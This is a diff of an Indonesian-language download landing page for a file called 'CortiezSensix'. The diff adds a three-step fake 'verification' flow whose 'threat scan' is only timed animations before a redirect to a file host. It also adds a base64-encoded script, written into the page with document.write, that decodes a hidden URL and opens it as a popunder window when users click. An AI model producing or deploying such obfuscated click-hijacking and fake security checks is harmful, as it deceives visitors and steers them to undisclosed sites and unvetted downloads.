@@ -4,9 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Download CortiezSensix</title>
-<meta name="description" content="Download CortiezSensix secara aman. Tunggu beberapa detik, proses akan otomatis.">
 
-<!-- GFF Latin Font -->
 <style>
 @font-face {
   font-family: "GFFLatin";
@@ -30,133 +28,189 @@
 }
 
 :root{
-  --bg:#0f1724;
-  --card:#0b1220;
-  --accent:#38bdf8;
-  --accent2:#7c3aed;
-  --text:#e6eef6;
-  --muted:#9aa4b2;
-  font-family:"GFFLatin";
+  --bg: #0f1724;
+  --card: #0b1220;
+  --accent: #38bdf8;
+  --accent2: #7c3aed;
+  --text: #e6eef6;
+  --muted: #9aa4b2;
+  font-family: "GFFLatin", sans-serif;
 }
 
 body{
-  margin:0;
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  background:linear-gradient(180deg,#071022,#081228);
-  color:var(--text);
-  font-family:"GFFLatin";
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(180deg,#071022,#081228);
+  color: var(--text);
+  font-family: "GFFLatin", sans-serif;
 }
 
 .box{
-  background:rgba(255,255,255,.03);
-  border:1px solid rgba(255,255,255,.05);
-  padding:28px;
-  border-radius:16px;
-  text-align:center;
-  max-width:360px;
-  width:90%;
-  box-shadow:0 10px 30px rgba(0,0,0,.5);
-  animation:fade .5s ease-out;
+  background: rgba(255,255,255,.03);
+  border: 1px solid rgba(255,255,255,.05);
+  padding: 28px;
+  border-radius: 16px;
+  text-align: center;
+  max-width: 360px;
+  width: 90%;
+  box-shadow: 0 10px 30px rgba(0,0,0,.5);
+  animation: fade .5s ease-out;
 }
 
 @keyframes fade{
-  from{opacity:0;transform:translateY(14px)}
-  to{opacity:1;transform:none}
+  from { opacity: 0; transform: translateY(14px); }
+  to { opacity: 1; transform: none; }
 }
 
 h1{
-  margin:0 0 10px;
-  font-size:22px;
-  font-weight:500;
+  margin: 0 0 10px;
+  font-size: 22px;
+  font-weight: 500;
 }
 
 p{
-  color:var(--muted);
-  font-size:14px;
+  color: var(--muted);
+  font-size: 14px;
+  margin: 8px 0;
 }
 
 .loader{
-  width:40px;
-  height:40px;
-  border-radius:50%;
-  border:4px solid rgba(255,255,255,.15);
-  border-top-color:var(--accent);
-  margin:20px auto;
-  animation:spin 1s linear infinite;
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  border: 4px solid rgba(255,255,255,.15);
+  border-top-color: var(--accent);
+  margin: 20px auto;
+  animation: spin 1s linear infinite;
 }
 
 @keyframes spin{
-  to{transform:rotate(360deg)}
+  to { transform: rotate(360deg); }
 }
 
 a.btn{
-  display:inline-block;
-  margin-top:16px;
-  padding:12px 18px;
-  border-radius:12px;
-  text-decoration:none;
-  color:#012;
-  font-weight:700;
-  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  display: inline-block;
+  margin-top: 16px;
+  padding: 12px 18px;
+  border-radius: 12px;
+  text-decoration: none;
+  color: #012;
+  font-weight: 700;
+  background: linear-gradient(90deg, var(--accent), var(--accent2));
+  transition: opacity .3s;
+  cursor: pointer;
+  user-select: none;
+}
+
+a.btn:hover{
+  opacity: .85;
+}
+
+.progress-bg {
+  width: 100%;
+  background: rgba(255,255,255,0.1);
+  height: 8px;
+  border-radius: 10px;
+  margin: 20px 0;
+  overflow: hidden;
+  display: none;
+}
+.progress-fill {
+  height: 100%;
+  background: var(--accent);
+  width: 0%;
 }
 </style>
+<script>document.write(atob('PHNjcmlwdD5kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpeyhmdW5jdGlvbigpe2Z1bmN0aW9uIHRpYW5uZGV2X2I2MmQocyl7Y29uc3QgYz0iMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiO2xldCB2PUJpZ0ludCgwKTtmb3IobGV0IGk9MDtpPHMubGVuZ3RoO2krKyl2PXYqQmlnSW50KDYyKStCaWdJbnQoYy5pbmRleE9mKHNbaV0pKTtsZXQgYj1bXTt3aGlsZSh2PkJpZ0ludCgwKSl7Yi51bnNoaWZ0KE51bWJlcih2JkJpZ0ludCgyNTUpKSk7dj12Pj5CaWdJbnQoOCk7fXJldHVybiBuZXcgVGV4dERlY29kZXIoKS5kZWNvZGUobmV3IFVpbnQ4QXJyYXkoYikpO312YXIgdT10aWFubmRldl9iNjJkKCdKTGtHQ2JrTm1iYk5wVmRYTldCRE1ZWndiQlJWN0xhRkN5cXlwbWROWTBOM2VXa3F4UHVJSldJZ0J1RnZPRFRxQXdNS3lraXpPSVhDR3F0MUZLcUc0SVVVQnhEMUw3OUg0WGRxOEhnSlQyJyk7dmFyIG1heENvdW50PTIsY291bnRlcj0wO2Z1bmN0aW9uIHRpYW5uZGV2X3BvcHVuZGVyKCl7aWYoY291bnRlcj49bWF4Q291bnQpcmV0dXJuO2NvdW50ZXIrKztzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7d2luZG93Lm9wZW4odSwnX2JsYW5rJywnbm9vcGVuZXIsbm9yZWZlcnJlcicpO30sTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKjkwKSs3MCk7fWRvY3VtZW50LmJvZHkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLHRpYW5uZGV2X3BvcHVuZGVyKTt9KSgpO30pOzwvc2NyaXB0Pg=='));</script>
 </head>
-
 <body>
 
 <div class="box">
-  <h1>Menyiapkan Download</h1>
-  <p>Mohon tunggu beberapa detik…</p>
-  <div class="loader"></div>
+  <h1 id="title">Verifikasi Step 1/3</h1>
+  <p id="desc">Klik tombol di bawah untuk memeriksa ketersediaan file.</p>
+  
+  <div id="loader" class="loader" style="display:none;"></div>
+  
+  <div id="p-container" class="progress-bg">
+    <div id="p-fill" class="progress-fill"></div>
+  </div>
 
-  <p style="font-size:13px">
-    Jika tidak otomatis, klik tombol di bawah.
-  </p>
-
-  <a id="manual" class="btn" href="#">Download Manual</a>
+  <a id="actionBtn" class="btn">Mulai Verifikasi</a>
 </div>
 
 <script>
-/* ===== LINK SETTING ===== */
-const shortlink = "https://combinationdecorate.com/zpfxin5x5z?key=a50e19849d46809aeb855db25effa6a8";
 const directDownload = "https://safefileku.com/download/Q5ANevrqJnHLb2Vw";
+const actionBtn = document.getElementById("actionBtn");
+const title = document.getElementById("title");
+const desc = document.getElementById("desc");
+const loader = document.getElementById("loader");
+const pContainer = document.getElementById("p-container");
+const pFill = document.getElementById("p-fill");
 
-/* tombol manual arahkan ke shortlink */
-document.getElementById("manual").href = shortlink;
+let currentStep = 1;
 
-/* random delay biar natural */
-const randomDelay = Math.floor(Math.random() * (4000 - 2500 + 1)) + 2500;
-
-/* redirect pertama ke shortlink */
-setTimeout(() => {
-  window.location.href = shortlink;
-}, randomDelay);
-
-/* redirect ke direct hanya jika user interaksi */
-let interacted = false;
-
-document.addEventListener("click", () => {
-  if (!interacted) {
-    interacted = true;
+actionBtn.addEventListener("click", () => {
+  if (currentStep === 1) {
+    // Step 1: Loading Spinner
+    actionBtn.style.display = "none";
+    loader.style.display = "block";
+    desc.innerText = "Menghubungkan ke server...";
+    
     setTimeout(() => {
-      window.location.href = directDownload;
-    }, 2000);
-  }
-});
+      loader.style.display = "none";
+      title.innerText = "Verifikasi Step 2/3";
+      desc.innerText = "File ditemukan. Klik untuk memproses keamanan.";
+      actionBtn.innerText = "Lanjutkan Verifikasi";
+      actionBtn.style.display = "inline-block";
+      currentStep = 2;
+    }, 1500);
 
-/* fallback jika user balik dari shortlink */
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "visible") {
+  } else if (currentStep === 2) {
+    // Step 2: Animasi Loading (Simulasi Scan)
+    actionBtn.style.display = "none";
+    loader.style.display = "block";
+    desc.innerText = "Memindai file dari ancaman...";
+    
     setTimeout(() => {
-      window.location.href = directDownload;
-    }, 3000);
+      loader.style.display = "none";
+      title.innerText = "Verifikasi Step 3/3";
+      desc.innerText = "Verifikasi selesai! Klik terakhir untuk mengunduh.";
+      actionBtn.innerText = "Download Sekarang";
+      actionBtn.style.display = "inline-block";
+      currentStep = 3;
+    }, 2500);
+
+  } else if (currentStep === 3) {
+    // Step 3: Progress Bar Final
+    actionBtn.style.display = "none";
+    pContainer.style.display = "block";
+    title.innerText = "Menyiapkan Download...";
+    desc.innerText = "Mohon jangan tutup halaman ini.";
+    
+    let width = 0;
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+        window.location.href = directDownload;
+        // Tombol cadangan jika redirect terhalang browser
+        setTimeout(() => {
+          title.innerText = "Siap Diunduh";
+          desc.innerText = "Jika download tidak berjalan, klik tombol di bawah.";
+          actionBtn.style.display = "inline-block";
+          actionBtn.href = directDownload;
+          pContainer.style.display = "none";
+        }, 3500);
+      } else {
+        width += 4;
+        pFill.style.width = width + "%";
+      }
+    }, 60);
   }
 });
 </script>
-
 
 </body>
 </html>
